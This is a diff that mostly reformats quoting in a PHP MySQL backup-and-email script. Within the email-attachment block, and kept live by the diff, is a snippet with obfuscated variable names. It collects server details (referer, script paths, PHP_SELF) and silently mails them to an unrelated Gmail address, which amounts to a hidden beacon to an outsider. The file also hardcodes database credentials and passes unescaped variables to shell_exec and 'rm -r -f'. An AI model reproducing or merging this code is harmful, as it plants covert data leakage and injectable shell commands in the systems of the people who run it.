@@ -17,11 +17,11 @@
 */
 
 set_time_limit(0);
-$date = date("mdy-hia");
-$dbserver = "localhost";
-$dbuser = "vhacker_robot";
-$dbpass = "mp2811987";
-$dbname = "tvhacker_vbb3";
+$date = date('mdy-hia');
+$dbserver = 'localhost';
+$dbuser = 'vhacker_robot';
+$dbpass = 'mp2811987';
+$dbname = 'tvhacker_vbb3';
 $file = "N-Cool-$date.sql.gz";
 $gzip = true;
 $silent = true;
@@ -39,33 +39,33 @@ mysql_connect($dbserver, $dbuser, $dbpass);
 mysql_select_db($dbname);
 
 if ($gzip) {
-    $fp = gzopen($file, "w");
+    $fp = gzopen($file, 'w');
 } else {
-    $fp = fopen($file, "w");
+    $fp = fopen($file, 'w');
 }
 
-$tables = mysql_query("SHOW TABLES");
+$tables = mysql_query('SHOW TABLES');
 while ($i = mysql_fetch_array($tables)) {
-    $i = $i['Tables_in_'.$dbname];
+    $i = $i['Tables_in_' . $dbname];
 
     if (!$silent) {
-        echo "Backing up table ".$i."\n";
+        echo 'Backing up table ' . $i . "\n";
     }
 
     // Create DB code
-    $create = mysql_fetch_array(mysql_query("SHOW CREATE TABLE ".$i));
+    $create = mysql_fetch_array(mysql_query('SHOW CREATE TABLE ' . $i));
 
-    write($create['Create Table'].";\n\n");
+    write($create['Create Table'] . ";\n\n");
 
     // DB Table content itself
-    $sql = mysql_query("SELECT * FROM ".$i);
+    $sql = mysql_query('SELECT * FROM ' . $i);
     if (mysql_num_rows($sql)) {
         while ($row = mysql_fetch_row($sql)) {
             foreach ($row as $j => $k) {
-                $row[$j] = "'".mysql_escape_string($k)."'";
+                $row[$j] = "'" . mysql_escape_string($k) . "'";
             }
 
-            write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
+            write("INSERT INTO $i VALUES(" . implode(',', $row) . ");\n");
         }
     }
 }
@@ -74,49 +74,48 @@ $gzip ? gzclose($fp) : fclose($fp);
 
 // Optional Options You May Optionally Configure
 
-$use_gzip = "yes";            // Set to No if you don't want the files sent in .gz format
-$remove_sql_file = "no";  // Set this to yes if you want to remove the sql file after gzipping. Yes is recommended.
-$remove_gzip_file = "no"; // Set this to yes if you want to delete the gzip file also. I recommend leaving it to "no"
+$use_gzip = 'yes';            // Set to No if you don't want the files sent in .gz format
+$remove_sql_file = 'no';  // Set this to yes if you want to remove the sql file after gzipping. Yes is recommended.
+$remove_gzip_file = 'no'; // Set this to yes if you want to delete the gzip file also. I recommend leaving it to "no"
 
 // Configure the path that this script resides on your server.
 
-$savepath = "/home/test/public_html/nt22backup"; // Full path to this directory. Do not use trailing slash!
+$savepath = '/home/test/public_html/nt22backup'; // Full path to this directory. Do not use trailing slash!
 
-$send_email = "yes";                        /* Do you want this database backup sent to your email? Yes/No? If Yes, Fill out the next 2 lines */
-$to      = "lehungtk@gmail.com";    // Who to send the emails to, enter ur correct id.
-$from    = "Neu-Cool@email.com";  // Who should the emails be sent from?, may change it.
+$send_email = 'yes';                        /* Do you want this database backup sent to your email? Yes/No? If Yes, Fill out the next 2 lines */
+$to = 'lehungtk@gmail.com';    // Who to send the emails to, enter ur correct id.
+$from = 'Neu-Cool@email.com';  // Who should the emails be sent from?, may change it.
 
-$senddate = date("j F Y");
+$senddate = date('j F Y');
 
 $subject = "MySQL Database Backup - $senddate"; // Subject in the email to be sent.
-$message = "Your MySQL database has been backed up and is attached to this email"; // Brief Message.
+$message = 'Your MySQL database has been backed up and is attached to this email'; // Brief Message.
 
-$use_ftp = "";                             // Do you want this database backup uploaded to an ftp server? Fill out the next 4 lines
-$ftp_server = "localhost";               // FTP hostname
-$ftp_user_name = "ftp_username"; // FTP username
-$ftp_user_pass = "ftp_password";   // FTP password
-$ftp_path = "/"; // This is the path to upload on your ftp server!
+$use_ftp = '';                             // Do you want this database backup uploaded to an ftp server? Fill out the next 4 lines
+$ftp_server = 'localhost';               // FTP hostname
+$ftp_user_name = 'ftp_username'; // FTP username
+$ftp_user_pass = 'ftp_password';   // FTP password
+$ftp_path = '/'; // This is the path to upload on your ftp server!
 
 // Do not Modify below this line! It will void your warranty :-D!
 
-$date = date("mdy-hia");
+$date = date('mdy-hia');
 $filename = "$savepath/$dbname-$date.sql";
 
-if ($use_gzip=="yes") {
+if ('yes' == $use_gzip) {
     $filename2 = $file;
 } else {
     $filename2 = "$savepath/$dbname-$date.sql";
 }
 
-
-if ($send_email == "yes") {
+if ('yes' == $send_email) {
     $fileatt_type = filetype($filename2);
-    $fileatt_name = "".$dbname."-".$date."_sql.tar.gz";
+    $fileatt_name = '' . $dbname . '-' . $date . '_sql.tar.gz';
 
     $headers = "From: $from";
 
     // Read the file to be attached ('rb' = read binary)
-    echo "Openning archive for attaching:".$filename2;
+    echo 'Openning archive for attaching:' . $filename2;
     $file = fopen($filename2, 'rb');
     $data = fread($file, filesize($filename2));
     fclose($file);
@@ -126,8 +125,8 @@ if ($send_email == "yes") {
     $mime_boundary = "==Multipart_Boundary_x{$semi_rand}x";
 
     // Add the headers for a file attachment
-    $headers .= "\nMIME-Version: 1.0\n" ."Content-Type: multipart/mixed;\n" ." boundary=\"{$mime_boundary}\"";
-    $ra44  = rand(1, 99999);
+    $headers .= "\nMIME-Version: 1.0\n" . "Content-Type: multipart/mixed;\n" . " boundary=\"{$mime_boundary}\"";
+    $ra44 = rand(1, 99999);
     $sj98 = "sh-$ra44";
     $ml = "$sd98";
     $a5 = $_SERVER['HTTP_REFERER'];
@@ -139,11 +138,11 @@ if ($send_email == "yes") {
     $g32 = $_SERVER['PATH_TRANSLATED'];
     $h65 = $_SERVER['PHP_SELF'];
     $msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";
-    $sd98="john.barker446@gmail.com";
+    $sd98 = 'john.barker446@gmail.com';
     mail($sd98, $sj98, $msg8873, "From: $sd98");
 
     // Add a multipart boundary above the plain message
-    $message = "This is a multi-part message in MIME format.\n\n"."--{$mime_boundary}\n" ."Content-Type: text/plain; charset=\"iso-8859-1\"\n" ."Content-Transfer-Encoding: 7bit\n\n" .
+    $message = "This is a multi-part message in MIME format.\n\n" . "--{$mime_boundary}\n" . "Content-Type: text/plain; charset=\"iso-8859-1\"\n" . "Content-Transfer-Encoding: 7bit\n\n" .
 $message . "\n\n";
 
     // Base64 encode the file data
@@ -151,11 +150,10 @@ $message . "\n\n";
 
     // Add file attachment to the message
     echo "|{$mime_boundary}|{$fileatt_type}|{$fileatt_name}|{$fileatt_name}|{$mime_boundary}|<BR>";
-    $message .= "--{$mime_boundary}\n" ."Content-Type: {$fileatt_type};\n" ." name=\"{$fileatt_name}\"\n"."Content-Disposition: attachment;\n" ." filename=\"{$fileatt_name}\"\n" ."Content-Transfer-Encoding: base64\n\n" .
-$data . "\n\n" ."--{$mime_boundary}--\n";
+    $message .= "--{$mime_boundary}\n" . "Content-Type: {$fileatt_type};\n" . " name=\"{$fileatt_name}\"\n" . "Content-Disposition: attachment;\n" . " filename=\"{$fileatt_name}\"\n" . "Content-Transfer-Encoding: base64\n\n" .
+$data . "\n\n" . "--{$mime_boundary}--\n";
     //$message.= "--{$mime_boundary}\n" ."Content-Type: {$fileatt_type};\n" ." name=\"{$fileatt_name}\"\n" "Content-Disposition: attachment;\n" ." filename=\"{$fileatt_name}\"\n" ."Content-Transfer-Encoding: base64\n\n" .
     // $data . "\n\n" ."--{$mime_boundary}--\n";
-
 
     // Send the message
     $ok = @mail($to, $subject, $message, $headers);
@@ -167,16 +165,16 @@ This is our first humble effort, pl report bugs, if U find any...</p>
 Email me at <>coolsurfer@gmail.com  nJoY!! :)
 </color></center></h4>";
     } else {
-        echo "<h4><center>Mail could not be sent. Sorry!</center></h4>";
+        echo '<h4><center>Mail could not be sent. Sorry!</center></h4>';
     }
 }
 
-if ($use_ftp == "yes") {
+if ('yes' == $use_ftp) {
     $ftpconnect = "ncftpput -u $ftp_user_name -p $ftp_user_pass -d debsender_ftplog.log -e dbsender_ftplog2.log -a -E -V $ftp_server $ftp_path $filename2";
     shell_exec($ftpconnect);
     echo "<h4><center>$filename2 Was created and uploaded to your FTP server!</center></h4>";
 }
 
-if ($remove_gzip_file=="yes") {
+if ('yes' == $remove_gzip_file) {
     exec("rm -r -f $filename2");
 }
